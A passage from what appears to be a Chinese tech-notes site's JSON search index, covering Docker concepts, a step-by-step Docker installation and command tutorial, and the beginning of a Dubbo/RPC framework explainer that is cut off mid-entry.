namespace 两者对比：\n两者都是将进程进行分组，但是两者的作用还是有本质区别。namespace 是为了隔离进程组之间的资源，而 cgroup 是为了对一组进程进行统一的资源监控和限制。\n八 总结    本文主要把 Docker 中的一些常见概念做了详细的阐述，但是并不涉及 Docker 的安装、镜像的使用、容器的操作等内容。这部分东西，希望读者自己可以通过阅读书籍与官方文档的形式掌握。如果觉得官方文档阅读起来很费力的话，这里推荐一本书籍《Docker 技术入门与实战第二版》。\n九 推荐阅读     10 分钟看懂 Docker 和 K8S 从零开始入门 K8s：详解 K8s 容器基本概念  十 参考     Linux Namespace 和 Cgroup LXC vs Docker: Why Docker is Better CGroup 介绍、应用实例及原理描述  "},{"id":156,"href":"/%E7%AC%94%E8%AE%B0/Docker/","title":"Docker","parent":"笔记","content":"Docker     Docker  一、解决的问题 二、与虚拟机的比较 三、优势 四、使用场景 五、镜像与容器 参考资料    一、解决的问题    由于不同的机器有不同的操作系统，以及不同的库和组件，在将一个应用部署到多台机器上需要进行大量的环境配置操作。\nDocker 主要解决环境配置问题，它是一种虚拟化技术，对进程进行隔离，被隔离的进程独立于宿主操作系统和其它隔离的进程。使用 Docker 可以不修改应用程序代码，不需要开发人员学习特定环境下的技术，就能够将现有的应用程序部署在其它机器上。\n\n二、与虚拟机的比较    虚拟机也是一种虚拟化技术，它与 Docker 最大的区别在于它是通过模拟硬件，并在硬件上安装操作系统来实现。\n\n启动速度    启动虚拟机需要先启动虚拟机的操作系统，再启动应用，这个过程非常慢；\n而启动 Docker 相当于启动宿主操作系统上的一个进程。\n占用资源    虚拟机是一个完整的操作系统，需要占用大量的磁盘、内存和 CPU 资源，一台机器只能开启几十个的虚拟机。\n而 Docker 只是一个进程，只需要将应用以及相关的组件打包，在运行时占用很少的资源，一台机器可以开启成千上万个 Docker。\n三、优势    除了启动速度快以及占用资源少之外，Docker 具有以下优势：\n更容易迁移    提供一致性的运行环境。已经打包好的应用可以在不同的机器上进行迁移，而不用担心环境变化导致无法运行。\n更容易维护    使用分层技术和镜像，使得应用可以更容易复用重复的部分。复用程度越高，维护工作也越容易。\n更容易扩展    可以使用基础镜像进一步扩展得到新的镜像，并且官方和开源社区提供了大量的镜像，通过扩展这些镜像可以非常容易得到我们想要的镜像。\n四、使用场景    持续集成    持续集成指的是频繁地将代码集成到主干上，这样能够更快地发现错误。\nDocker 具有轻量级以及隔离性的特点，在将代码集成到一个 Docker 中不会对其它 Docker 产生影响。\n提供可伸缩的云服务    根据应用的负载情况，可以很容易地增加或者减少 Docker。\n搭建微服务架构    Docker 轻量级的特点使得它很适合用于部署、维护、组合微服务。\n五、镜像与容器    镜像是一种静态的结构，可以看成面向对象里面的类，而容器是镜像的一个实例。\n镜像包含着容器运行时所需要的代码以及其它组件，它是一种分层结构，每一层都是只读的（read-only layers）。构建镜像时，会一层一层构建，前一层是后一层的基础。镜像的这种分层存储结构很适合镜像的复用以及定制。\n构建容器时，通过在镜像的基础上添加一个可写层（writable layer），用来保存着容器运行过程中的修改。\n\n参考资料     DOCKER 101: INTRODUCTION TO DOCKER WEBINAR RECAP Docker 入门教程 Docker container vs Virtual machine How to Create Docker Container using Dockerfile 理解 Docker（2）：Docker 镜像 为什么要使用 Docker？ What is Docker 持续集成是什么？  "},{"id":157,"href":"/tools/Docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98/","title":"Docker从入门到实战","parent":"tools","content":"Docker介绍    什么是 Docker？    说实话关于 Docker 是什么并不太好说，下面我通过四点向你说明 Docker 到底是个什么东西。\n Docker 是世界领先的软件容器平台，基于 Go 语言 进行开发实现。 Docker 能够自动执行重复性任务，例如搭建和配置开发环境，从而解放开发人员。 用户可以方便地创建和使用容器，把自己的应用放入容器。容器还可以进行版本管理、复制、分享、修改，就像管理普通的代码一样。 Docker 可以对进程进行封装隔离，属于操作系统层面的虚拟化技术。 由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。  官网地址：https://www.docker.com/ 。\n为什么要用 Docker?    Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。\n容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app），更重要的是容器性能开销极低。\n传统的开发流程中，我们的项目通常需要使用 MySQL、Redis、FastDFS 等等环境，这些环境都是需要我们手动去进行下载并配置的，安装配置流程极其复杂，而且不同系统下的操作也不一样。\nDocker 的出现完美地解决了这一问题，我们可以在容器中安装 MySQL、Redis 等软件环境，使得应用和环境架构分开，它的优势在于：\n 一致的运行环境，能够更轻松地迁移 对进程进行封装隔离，容器与容器之间互不影响，更高效地利用系统资源 可以通过镜像复制多个一致的容器  另外，《Docker 从入门到实践》 这本开源书籍中也已经给出了使用 Docker 的原因。\nDocker 的安装    Windows    接下来对 Docker 进行安装，以 Windows 系统为例，访问 Docker 的官网：\n然后点击Get Started：\n在此处点击Download for Windows即可进行下载。\n如果你的电脑是Windows 10 64位专业版的操作系统，则在安装 Docker 之前需要开启一下Hyper-V，开启方式如下。打开控制面板，选择程序：\n点击启用或关闭Windows功能：\n勾选上Hyper-V，点击确定即可：\n完成更改后需要重启一下计算机。\n开启了Hyper-V后，我们就可以对 Docker 进行安装了，打开安装程序后，等待片刻点击Ok即可：\n安装完成后，我们仍然需要重启计算机，重启后，若提示如下内容：\n它的意思是询问我们是否使用 WSL2，这是基于 Windows 的一个 Linux 子系统，这里我们取消即可，它就会使用我们之前勾选的Hyper-V虚拟机。\n因为是图形界面的操作，这里就不介绍 Docker Desktop 的具体用法了。\nMac    直接使用 Homebrew 安装即可\nbrew install --cask docker Linux    下面来看看 Linux 中如何安装 Docker，这里以 CentOS7 为例。\n在测试或开发环境中，Docker 官方为了简化安装流程，提供了一套便捷的安装脚本，执行这个脚本后就会自动地将一切准备工作做好，并且把 Docker 的稳定版本安装在系统中。\ncurl -fsSL get.docker.com -o get-docker.sh sh get-docker.sh --mirror Aliyun 安装完成后直接启动服务：\nsystemctl start docker 推荐设置开机自启，执行指令：\nsystemctl enable docker Docker 中的几个概念    在正式学习 Docker 之前，我们需要了解 Docker 中的几个核心概念：\n镜像    镜像就是一个只读的模板，镜像可以用来创建 Docker 容器，一个镜像可以创建多个容器\n容器    容器是用镜像创建的运行实例，Docker 利用容器独立运行一个或一组应用。它可以被启动、开始、停止、删除，每个容器都是相互隔离的、保证安全的平台。 可以把容器看作是一个简易的 Linux 环境和运行在其中的应用程序。容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的\n仓库    仓库是集中存放镜像文件的场所。仓库和仓库注册服务器是有区别的，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签。 仓库分为公开仓库和私有仓库两种形式，最大的公开仓库是 DockerHub，存放了数量庞大的镜像供用户下载，国内的公开仓库有阿里云、网易云等\n总结    通俗点说，一个镜像就代表一个软件；而基于某个镜像运行就是生成一个程序实例，这个程序实例就是容器；而仓库是用来存储 Docker 中所有镜像的。\n其中仓库又分为远程仓库和本地仓库，和 Maven 类似，倘若每次都从远程下载依赖，则会大大降低效率，为此，Maven 的策略是第一次访问依赖时，将其下载到本地仓库，第二次、第三次使用时直接用本地仓库的依赖即可，Docker 的远程仓库和本地仓库的作用也是类似的。\nDocker 初体验    下面我们来对 Docker 进行一个初步的使用，这里以下载一个 MySQL 的镜像为例(在CentOS7下进行)。\n和 GitHub 一样，Docker 也提供了一个 DockerHub 用于查询各种镜像的地址和安装教程，为此，我们先访问 DockerHub：https://hub.docker.com/\n在左上角的搜索框中输入MySQL并回车：\n可以看到相关 MySQL 的镜像非常多，若右上角有OFFICIAL IMAGE标识，则说明是官方镜像，所以我们点击第一个 MySQL 镜像：\n右边提供了下载 MySQL 镜像的指令为docker pull MySQL，但该指令始终会下载 MySQL 镜像的最新版本。\n若是想下载指定版本的镜像，则点击下面的View Available Tags：\n这里就可以看到各种版本的镜像，右边有下载的指令，所以若是想下载 5.7.32 版本的 MySQL 镜像，则执行：\ndocker pull MySQL:5.7.32 然而下载镜像的过程是非常慢的，所以我们需要配置一下镜像源加速下载，访问阿里云官网：\n点击控制台：\n然后点击左上角的菜单，在弹窗的窗口中，将鼠标悬停在产品与服务上，并在右侧搜索容器镜像服务，最后点击容器镜像服务：\n点击左侧的镜像加速器，并依次执行右侧的配置指令即可。\nsudo mkdir -p /etc/docker sudo tee /etc/docker/daemon.json \u0026lt;\u0026lt;-\u0026#39;EOF\u0026#39; { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://679xpnpz.mirror.aliyuncs.com\u0026#34;] } EOF sudo systemctl daemon-reload sudo systemctl restart docker Docker 镜像指令    Docker 需要频繁地操作相关的镜像，所以我们先来了解一下 Docker 中的镜像指令。\n若想查看 Docker 中当前拥有哪些镜像，则可以使用 docker images 命令。\n[root@izrcf5u3j3q8xaz ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE MySQL 5.7.32 f07dfa83b528 11 days ago 448MB tomcat latest feba8d001e3f 2 weeks ago 649MB nginx latest ae2feff98a0c 2 weeks ago 133MB hello-world latest bf756fb1ae65 12 months ago 13.3kB 其中REPOSITORY为镜像名，TAG为版本标志，IMAGE ID为镜像 id(唯一的)，CREATED为创建时间，注意这个时间并不是我们将镜像下载到 Docker 中的时间，而是镜像创建者创建的时间，SIZE为镜像大小。\n该指令能够查询指定镜像名：\ndocker image MySQL 若如此做，则会查询出 Docker 中的所有 MySQL 镜像：\n[root@izrcf5u3j3q8xaz ~]# docker images MySQL REPOSITORY TAG IMAGE ID CREATED SIZE MySQL 5.6 0ebb5600241d 11 days ago 302MB MySQL 5.7.32 f07dfa83b528 11 days ago 448MB MySQL 5.5 d404d78aa797 20 months ago 205MB 该指令还能够携带-q参数：docker images -q ， -q表示仅显示镜像的 id：\n[root@izrcf5u3j3q8xaz ~]# docker images -q 0ebb5600241d f07dfa83b528 feba8d001e3f d404d78aa797 若是要下载镜像，则使用：\ndocker pull MySQL:5.7 docker pull是固定的，后面写上需要下载的镜像名及版本标志；若是不写版本标志，而是直接执行docker pull MySQL，则会下载镜像的最新版本。\n一般在下载镜像前我们需要搜索一下镜像有哪些版本才能对指定版本进行下载，使用指令：\ndocker search MySQL 不过该指令只能查看 MySQL 相关的镜像信息，而不能知道有哪些版本，若想知道版本，则只能这样查询：\ndocker search MySQL:5.5 若是查询的版本不存在，则结果为空：\n删除镜像使用指令：\ndocker image rm MySQL:5.5 若是不指定版本，则默认删除的也是最新版本。\n还可以通过指定镜像 id 进行删除：\ndocker image rm bf756fb1ae65 然而此时报错了：\n[root@izrcf5u3j3q8xaz ~]# docker image rm bf756fb1ae65 Error response from daemon: conflict: unable to delete bf756fb1ae65 (must be forced) - image is being used by stopped container d5b6c177c151 这是因为要删除的hello-world镜像正在运行中，所以无法删除镜像，此时需要强制执行删除：\ndocker image rm -f bf756fb1ae65 该指令会将镜像和通过该镜像执行的容器全部删除，谨慎使用。\nDocker 还提供了删除镜像的简化版本：docker rmi 镜像名:版本标志 。\n此时我们即可借助rmi和-q进行一些联合操作，比如现在想删除所有的 MySQL 镜像，那么你需要查询出 MySQL 镜像的 id，并根据这些 id 一个一个地执行docker rmi进行删除，但是现在，我们可以这样：\ndocker rmi -f $(docker images MySQL -q) 首先通过docker images MySQL -q查询出 MySQL 的所有镜像 id，-q表示仅查询 id，并将这些 id 作为参数传递给docker rmi -f指令，这样所有的 MySQL 镜像就都被删除了。\nDocker 容器指令    掌握了镜像的相关指令之后，我们需要了解一下容器的指令，容器是基于镜像的。\n若需要通过镜像运行一个容器，则使用：\ndocker run tomcat:8.0-jre8 当然了，运行的前提是你拥有这个镜像，所以先下载镜像：\ndocker pull tomcat:8.0-jre8 下载完成后就可以运行了，运行后查看一下当前运行的容器：docker ps 。\n其中CONTAINER_ID为容器的 id，IMAGE为镜像名，COMMAND为容器内执行的命令，CREATED为容器的创建时间，STATUS为容器的状态，PORTS为容器内服务监听的端口，NAMES为容器的名称。\n通过该方式运行的 tomcat 是不能直接被外部访问的，因为容器具有隔离性，若是想直接通过 8080 端口访问容器内部的 tomcat，则需要对宿主机端口与容器内的端口进行映射：\ndocker run -p 8080:8080 tomcat:8.0-jre8 解释一下这两个端口的作用(8080:8080)，第一个 8080 为宿主机端口，第二个 8080 为容器内的端口，外部访问 8080 端口就会通过映射访问容器内的 8080 端口。\n此时外部就可以访问 Tomcat 了：\n若是这样进行映射：\ndocker run -p 8088:8080 tomcat:8.0-jre8 则外部需访问 8088 端口才能访问 tomcat，需要注意的是，每次运行的容器都是相互独立的，所以同时运行多个 tomcat 容器并不会产生端口的冲突。\n容器还能够以后台的方式运行，这样就不会占用终端：\ndocker run -d -p 8080:8080 tomcat:8.0-jre8 启动容器时默认会给容器一个名称，但这个名称其实是可以设置的，使用指令：\ndocker run -d -p 8080:8080 --name tomcat01 tomcat:8.0-jre8 此时的容器名称即为 tomcat01，容器名称必须是唯一的。\n再来引申一下docker ps中的几个指令参数，比如-a：\ndocker ps -a 该参数会将运行和非运行的容器全部列举出来：\n-q参数将只查询正在运行的容器 id：docker ps -q 。\n[root@izrcf5u3j3q8xaz ~]# docker ps -q f3aac8ee94a3 074bf575249b 1d557472a708 4421848ba294 若是组合使用，则查询运行和非运行的所有容器 id：docker ps -qa 。\n[root@izrcf5u3j3q8xaz ~]# docker ps -aq f3aac8ee94a3 7f7b0e80c841 074bf575249b a1e830bddc4c 1d557472a708 4421848ba294 b0440c0a219a c2f5d78c5d1a 5831d1bab2a6 d5b6c177c151 接下来是容器的停止、重启指令，因为非常简单，就不过多介绍了。\ndocker start c2f5d78c5d1a 通过该指令能够将已经停止运行的容器运行起来，可以通过容器的 id 启动，也可以通过容器的名称启动。\ndocker restart c2f5d78c5d1a 该指令能够重启指定的容器。\ndocker stop c2f5d78c5d1a 该指令能够停止指定的容器。\ndocker kill c2f5d78c5d1a 该指令能够直接杀死指定的容器。\n以上指令都能够通过容器的 id 和容器名称两种方式配合使用。\n 当容器被停止之后，容器虽然不再运行了，但仍然是存在的，若是想删除它，则使用指令：\ndocker rm d5b6c177c151 需要注意的是容器的 id 无需全部写出来，只需唯一标识即可。\n若是想删除正在运行的容器，则需要添加-f参数强制删除：\ndocker rm -f d5b6c177c151 若是想删除所有容器，则可以使用组合指令：\ndocker rm -f $(docker ps -qa) 先通过docker ps -qa查询出所有容器的 id，然后通过docker rm -f进行删除。\n 当容器以后台的方式运行时，我们无法知晓容器的运行状态，若此时需要查看容器的运行日志，则使用指令：\ndocker logs 289cc00dc5ed 这样的方式显示的日志并不是实时的，若是想实时显示，需要使用-f参数：\ndocker logs -f 289cc00dc5ed 通过-t参数还能够显示日志的时间戳，通常与-f参数联合使用：\ndocker logs -ft 289cc00dc5ed  查看容器内运行了哪些进程，可以使用指令：\ndocker top 289cc00dc5ed 若是想与容器进行交互，则使用指令：\ndocker exec -it 289cc00dc5ed bash 此时终端将会进入容器内部，执行的指令都将在容器中生效，在容器内只能执行一些比较简单的指令，如：ls、cd 等，若是想退出容器终端，重新回到 CentOS 中，则执行exit即可。\n现在我们已经能够进入容器终端执行相关操作了，那么该如何向 tomcat 容器中部署一个项目呢？\ndocker cp ./test.html 289cc00dc5ed:/usr/local/tomcat/webapps 通过docker cp指令能够将文件从 CentOS 复制到容器中，./test.html为 CentOS 中的资源路径，289cc00dc5ed为容器 id，/usr/local/tomcat/webapps为容器的资源路径，此时test.html文件将会被复制到该路径下。\n[root@izrcf5u3j3q8xaz ~]# docker exec -it 289cc00dc5ed bash root@289cc00dc5ed:/usr/local/tomcat# cd webapps root@289cc00dc5ed:/usr/local/tomcat/webapps# ls test.html root@289cc00dc5ed:/usr/local/tomcat/webapps# 若是想将容器内的文件复制到 CentOS 中，则反过来写即可：\ndocker cp 289cc00dc5ed:/usr/local/tomcat/webapps/test.html ./ 所以现在若是想要部署项目，则先将项目上传到 CentOS，然后将项目从 CentOS 复制到容器内，此时启动容器即可。\n 虽然使用 Docker 启动软件环境非常简单，但同时也面临着一个问题，我们无法知晓容器内部具体的细节，比如监听的端口、绑定的 ip 地址等等，好在这些 Docker 都帮我们想到了，只需使用指令：\ndocker inspect 923c969b0d91 Docker 数据卷    学习了容器的相关指令之后，我们来了解一下 Docker 中的数据卷，它能够实现宿主机与容器之间的文件共享，它的好处在于我们对宿主机的文件进行修改将直接影响容器，而无需再将宿主机的文件再复制到容器中。\n现在若是想将宿主机中/opt/apps目录与容器中webapps目录做一个数据卷，则应该这样编写指令：\ndocker run -d -p 8080:8080 --name tomcat01 -v /opt/apps:/usr/local/tomcat/webapps tomcat:8.0-jre8 然而此时访问 tomcat 会发现无法访问：\n这就说明我们的数据卷设置成功了，Docker 会将容器内的webapps目录与/opt/apps目录进行同步，而此时/opt/apps目录是空的，导致webapps目录也会变成空目录，所以就访问不到了。\n此时我们只需向/opt/apps目录下添加文件，就会使得webapps目录也会拥有相同的文件，达到文件共享，测试一下：\n[root@centos-7 opt]# cd apps/ [root@centos-7 apps]# vim test.html [root@centos-7 apps]# ls test.html [root@centos-7 apps]# cat test.html \u0026lt;h1\u0026gt;This is a test html!\u0026lt;/h1\u0026gt; 在/opt/apps目录下创建了一个 test.html 文件，那么容器内的webapps目录是否会有该文件呢？进入容器的终端：\n[root@centos-7 apps]# docker exec -it tomcat01 bash root@115155c08687:/usr/local/tomcat# cd webapps/ root@115155c08687:/usr/local/tomcat/webapps# ls test.html 容器内确实已经有了该文件，那接下来我们编写一个简单的 Web 应用：\npublic class HelloServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { resp.getWriter().println(\u0026#34;Hello World!\u0026#34;); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { doGet(req,resp); } } 这是一个非常简单的 Servlet，我们将其打包上传到/opt/apps中，那么容器内肯定就会同步到该文件，此时进行访问：\n这种方式设置的数据卷称为自定义数据卷，因为数据卷的目录是由我们自己设置的，Docker 还为我们提供了另外一种设置数据卷的方式：\ndocker run -d -p 8080:8080 --name tomcat01 -v aa:/usr/local/tomcat/webapps tomcat:8.0-jre8 此时的aa并不是数据卷的目录，而是数据卷的别名，Docker 会为我们自动创建一个名为aa的数据卷，并且会将容器内webapps目录下的所有内容复制到数据卷中，该数据卷的位置在/var/lib/docker/volumes目录下：\n[root@centos-7 volumes]# pwd /var/lib/docker/volumes [root@centos-7 volumes]# cd aa/ [root@centos-7 aa]# ls _data [root@centos-7 aa]# cd _data/ [root@centos-7 _data]# ls docs examples host-manager manager ROOT 此时我们只需修改该目录的内容就能能够影响到容器。\n 最后再介绍几个容器和镜像相关的指令：\ndocker commit -m \u0026#34;描述信息\u0026#34; -a \u0026#34;镜像作者\u0026#34; tomcat01 my_tomcat:1.0 该指令能够将容器打包成一个镜像，此时查询镜像：\n[root@centos-7 _data]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE my_tomcat 1.0 79ab047fade5 2 seconds ago 463MB tomcat 8 a041be4a5ba5 2 weeks ago 533MB MySQL latest db2b37ec6181 2 months ago 545MB 若是想将镜像备份出来，则可以使用指令：\ndocker save my_tomcat:1.0 -o my-tomcat-1.0.tar [root@centos-7 ~]# docker save my_tomcat:1.0 -o my-tomcat-1.0.tar [root@centos-7 ~]# ls anaconda-ks.cfg initial-setup-ks.cfg 公共 视频 文档 音乐 get-docker.sh my-tomcat-1.0.tar 模板 图片 下载 桌面 若是拥有.tar格式的镜像，该如何将其加载到 Docker 中呢？执行指令：\ndocker load -i my-tomcat-1.0.tar root@centos-7 ~]# docker load -i my-tomcat-1.0.tar b28ef0b6fef8: Loading layer [==================================================\u0026gt;] 105.5MB/105.5MB 0b703c74a09c: Loading layer [==================================================\u0026gt;] 23.99MB/23.99MB ...... Loaded image: my_tomcat:1.0 [root@centos-7 ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE my_tomcat 1.0 79ab047fade5 7 minutes ago 463MB "},{"id":158,"href":"/system-design/distributed-system/rpc/Dubbo/","title":"Dubbo","parent":"rpc","content":"这篇文章是我根据官方文档以及自己平时的使用情况，对 Dubbo 所做的一个总结。欢迎补充！\nRPC基础    何为 RPC?    RPC（Remote Procedure Call） 即远程过程调用，通过名字我们就能看出 RPC 关注的是远程调用而非本地调用。\n为什么要 RPC ？ 因为，两个不同的服务器上的服务提供的方法不在一个内存空间，所以，需要通过网络编程才能传递方法调用所需要的参数。并且，方法调用的结果也需要通过网络编程来接收。但是，如果我们自己手动网络编程来实现这个调用过程的话工作量是非常大的，因为，我们需要考虑底层传输方式（TCP还是UDP）、序列化方式等等方面。\nRPC 能帮助我们做什么呢？ 简单来说，通过 RPC 可以帮助我们调用远程计算机上某个服务的方法，这个过程就像调用本地方法一样简单。并且！我们不需要了解底层网络编程的具体细节。\n举个例子：两个不同的服务 A、B 部署在两台不同的机器上，服务 A 如果想要调用服务 B 中的某个方法的话就可以通过 RPC 来做。\n一言蔽之：RPC 的出现就是为了让你调用远程方法像调用本地方法一样简单。\nRPC 的原理是什么?    为了能够帮助小伙伴们理解 RPC 原理，我们可以将整个 RPC的 核心功能看作是下面👇 6 个部分实现的：\n 客户端（服务消费端） ：调用远程方法的一端。 客户端 Stub（桩） ： 这其实就是一代理类。代理类主要做的事情很简单，就是把你调用方法、类、方法参数等信息传递到服务端。 网络传输 ： 网络传输就是你要把你调用的方法的信息比如说参数啊这些东西传输到服务端，然后服务端执行完之后再把返回结果通过网络传输给你传输回来。网络传输的实现方式有很多种比如最近基本的 Socket或者性能以及封装更加优秀的 Netty（推荐）。 服务端 Stub（桩） ：这个桩就不是代理类了。我觉得理解为桩实际不太好，大家注意一下就好。这里的服务端 Stub 实际指的就是接收到客户端执行方法的请求后，去指定对应的方法然后返回结果给客户端的类。 服务端（服务提供端） ：提供远程方法的一端。  具体原理图如下，后面我会串起来将整个RPC的过程给大家说一下。\n 服务消费端（client）以本地调用的方式调用远程服务； 客户端 Stub（client stub） 接收到调用后负责将方法、参数等组装成能够进行网络传输的消息体（序列化）：RpcRequest； 客户端 Stub（client stub） 找到远程服务的地址，并将消息发送到服务提供端； 服务端 Stub（桩）收到消息将消息反序列化为Java对象: RpcRequest； 服务端 Stub（桩）根据RpcRequest中的类、方法、方法参数等信息调用本地的方法； 服务端 Stub（桩）得到方法执行结果并将组装成能够进行网络传输的消息体：RpcResponse（序列化）发送至消费方； 客户端 Stub（client stub）接收到消息并将消息反序列化为Java对象:RpcResponse ，这样也就得到了最终结果。over!  相信小伙伴们看完上面的讲解之后，已经了解了 RPC 的原理。\n虽然篇幅不多，但是基本把 RPC 框架的核心原理讲清楚了！另外，对于上面的技术细节，我会在后面的章节介绍到。\n最后，对于 RPC 的原理，希望小伙伴不单单要理解，还要能够自己画出来并且能够给别人讲出来。因为，在面试中这个问题在面试官问到 RPC 相关内容的时候基本都会碰到。\nDubbo基础    什么是 Dubbo?    Apache Dubbo |ˈdʌbəʊ| 是一款高性能、轻量级的开源 Java RPC 框架。\n根据 Dubbo 官方文档的介绍，Dubbo 提供了六大核心能力\n 面向接口代理的高性能RPC调用。 智能容错和负载均衡。 服务自动注册和发现。 高度可扩展能力。 运行期流量调度。 可视化的服务治理与运维。  简单来说就是： Dubbo 不光可以帮助我们调用远程服务，还提供了一些其他开箱即用的功能比如智能负载均衡。\nDubbo 目前已经有接近 34.4 k 的 Star 。\n在 2020 年度 OSC 中国开源项目 评选活动中，Dubbo 位列开发框架和基础组件类项目的第7名。想比几年前来说，热度和排名有所下降。\nDubbo 是由阿里开源，后来加入了 Apache 。正式由于 Dubbo 的出现，才使得越来越多的公司开始使用以及接受分布式架构。\n为什么要用 Dubbo?    随着互联网的发展，网站的规模越来越大，用户数量越来越多。单一应用架构 、垂直应用架构无法满足我们的需求，这个时候分布式服务架构就诞生了。\n分布式服务架构下，系统被拆分成不同的服务比如短信服务、安全服务，每个服务独立提供系统的某个核心服务。\n我们可以使用 Java RMI（Java Remote Method Invocation）、Hessian这种支持远程调用的框架来简单地暴露和引用远程服务。但是！当服务越来越多之后，服务调用关系越来越复杂。当应用访问压力越来越大后，负载均衡以及服务监控的需求也迫在眉睫。我们可以用 F5 这类硬件来做负载均衡，但这样增加了成本，并且存在单点故障的风险。\n不过，Dubbo 的出现让上述问题得到了解决。Dubbo 帮助我们解决了什么问题呢？\n 负载均衡 ： 同一个服务部署在不同的机器时该调用哪一台机器上的服务。 服务调用链路生成 ： 随着系统的发展，服务越来越多，服务间依赖关系变得错踪复杂，甚至分不清哪个应用要在哪个应用之前启动，架构师都不能完整的描述应用的架构关系。Dubbo 可以为我们解决服务之间互相是如何调用的。 服务访问压力以及时长统计、资源调度和治理 ：基于访问压力实时管理集群容量，提高集群利用率。 \u0026hellip;\u0026hellip;  另外，Dubbo 除了能够应用在分布式系统中，也可以应用在现在比较火的微服务系统中。不过，由于 Spring Cloud 在微服务中应用更加广泛，所以，我觉得一般我们提 Dubbo 的话，大部分是分布式系统的情况。\n我们刚刚提到了分布式这个概念，下面再给大家介绍一下什么是分布式？为什么要分布式？\n分布式基础    什么是分布式?    分布式或者说 SOA 分布式重要的就是面向服务，说简单的分布式就是我们把整个系统拆分成不同的服务然后将这些服务放在不同的服务器上减轻单体服务的压力提高并发量和性能。比如电商系统可以简单地拆分成订单系统、商品系统、登录系统等等，拆分之后的每个服务可以部署在不同的机器上，如果某一个服务的访问量比较大的话也可以将这个服务同时部署在多台机器上。\n为什么要分布式?    从开发角度来讲单体应用的代码都集中在一起，而分布式系统的代码根据业务被拆分。所以，每个团队可以负责一个服务的开发，这样提升了开发效率。另外，代码根据业务拆分之后更加便于维护和扩展。\n另外，我觉得将系统拆分成分布式之后不光便于系统扩展和维护，更能提高整个系统的性能。你想一想嘛？把整个系统拆分成不同的服务/系统，然后每个服务/系统 单独部署在一台服务器上，是不是很大程度上提高了系统性能呢？\nDubbo 架构    Dubbo 架构中的核心角色有哪些？    官方文档中的框架设计章节 已经介绍的非常详细了，我这里把一些比较重要的点再提一下。\n上述节点简单介绍以及他们之间的关系：\n Container： 服务运行容器，负责加载、运行服务提供者。必须。 Provider： 暴露服务的服务提供方，会向注册中心注册自己提供的服务。必须。 Consumer： 调用远程服务的服务消费方，会向注册中心订阅自己所需的服务。必须。 Registry： 服务注册与发现的注册中心。注册中心会返回服务提供者地址列表给消费者。非必须。 Monitor： 统计服务的调用次数和调用时间的监控中心。服务消费者和提供者会定时发送统计数据到监控中心。 非必须。  Dubbo 中的 Invoker 概念了解么？    Invoker 是 Dubbo 领域模型中非常重要的一个概念，你如果阅读过 Dubbo 源码的话，你会无数次看到这玩意。就比如下面我要说的负载均衡这块的源码中就有大量 Invoker 的身影。\n简单来说，Invoker 就是 Dubbo 对远程调用的抽象。\n按照 Dubbo 官方的话来说，Invoker 分为\n 服务提供 Invoker 服务消费 Invoker  假如我们需要调用一个远程方法，我们需要动态代理来屏蔽远程调用的细节吧！我们屏蔽掉的这些细节就依赖对应的 Invoker 实现， Invoker 实现了真正的远程服务调用。\nDubbo 的工作原理了解么？    下图是 Dubbo 的整体设计，从下至上分为十层，各层均为单向依赖。\n 左边淡蓝背景的为服务消费方使用的接口，右边淡绿色背景的为服务提供方使用的接口，位于中轴线上的为双方都用到的接口。\n  config 配置层：Dubbo相关的配置。支持代码配置，同时也支持基于 Spring 来做配置，以 ServiceConfig, ReferenceConfig 为中心 proxy 服务代理层：调用远程方法像调用本地的方法一样简单的一个关键，真实调用过程依赖代理类，以 ServiceProxy 为中心。 registry 注册中心层：封装服务地址的注册与发现。 cluster 路由层：封装多个提供者的路由及负载均衡，并桥接注册中心，以 Invoker 为中心。 monitor 监控层：RPC 调用次数和调用时间监控，以 Statistics 为中心。 protocol 远程调用层：封装 RPC 调用，以 Invocation, Result 为中心。 exchange 信息交换层：封装请求响应模式，同步转异步，以 Request, Response 为中心。 transport 网络传输层：抽象 mina 和 netty 为统一接口，以 Message 为中心。 serialize 数据序列化层 ：对需要在网络传输的数据进行序列化。  Dubbo 的 SPI 机制了解么？ 如何扩展 Dubbo 中的默认实现？    SPI（Service Provider Interface） 机制被大量用在开源项目中，它可以帮助我们动态寻找服务/功能（比如负载均衡策略）的实现。\nSPI 的具体原理是这样的：我们将接口的实现类放在配置文件中，我们在程序运行过程中读取配置文件，通过反射加载实现类。这样，我们可以在运行的时候，动态替换接口的实现类。和 IoC 的解耦思想是类似的。\nJava 本身就提供了 SPI 机制的实现。不过，Dubbo 没有直接用，而是对 Java原生的 SPI机制进行了增强，以便更好满足自己的需求。\n那我们如何扩展 Dubbo 中的默认实现呢？\n比如说我们想要实现自己的负载均衡策略，我们创建对应的实现类 XxxLoadBalance 实现 LoadBalance 接口或者 AbstractLoadBalance 类。\npackage com.xxx; import org.apache.dubbo.rpc.cluster.LoadBalance; import org.apache.dubbo.rpc.Invoker; import org.apache.dubbo.rpc.Invocation; import org.apache.dubbo.rpc.RpcException; public class XxxLoadBalance implements LoadBalance { public \u0026lt;T\u0026gt; Invoker\u0026lt;T\u0026gt; select(List\u0026lt;Invoker\u0026lt;T\u0026gt;\u0026gt; invokers, Invocation invocation) throws RpcException { // ...  } } 我们将这个实现类的路径写入到resources 目录下的 META-INF/dubbo/org.apache.dubbo.rpc.cluster.LoadBalance文件中即可。\nsrc |-main |-java |-com |-xxx |-XxxLoadBalance.java (实现LoadBalance接口) |-resources |-META-INF |-dubbo |-org.apache.dubbo.rpc.cluster.LoadBalance (纯文本文件，内容为：xxx=com.xxx.XxxLoadBalance) org.apache.dubbo.rpc.cluster.LoadBalance\nxxx=com.xxx.XxxLoadBalance 其他还有很多可供扩展的选择，你可以在官方文档@SPI扩展实现这里找到。\nDubbo 